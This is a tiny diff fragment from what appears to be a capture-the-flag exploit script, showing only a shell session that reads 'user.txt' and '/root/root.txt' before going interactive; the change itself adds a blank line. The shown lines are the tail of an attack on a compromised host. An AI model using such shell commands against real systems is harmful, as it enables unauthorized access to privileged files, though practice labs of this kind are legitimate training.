@@ -49,3 +49,4 @@ if __name__ == '__main__':
     shell.sendline("cat /var/www/user.txt")
     shell.sendline("cat /root/root.txt")
     shell.interactive()
+    
